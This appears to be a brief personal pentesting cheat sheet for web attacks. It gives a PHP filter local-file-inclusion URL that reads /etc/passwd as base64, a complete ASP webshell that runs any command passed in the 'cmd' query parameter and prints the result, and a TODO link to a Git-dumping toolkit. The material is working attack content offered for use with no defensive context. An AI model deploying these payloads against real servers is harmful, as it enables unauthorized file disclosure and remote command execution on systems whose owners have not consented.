# Web
Read PHP Code with PHP Filter :
```http
https://X.X.X.X/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd
```
## Webshell
ASP : 
```aspx
<%
Response.write("<pre>")
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c " & Request.QueryString("cmd"))
o = cmd.StdOut.Readall()
Response.write(o)
Response.write("</pre>")
%>
```

TODO :
https://github.com/internetwache/GitTools
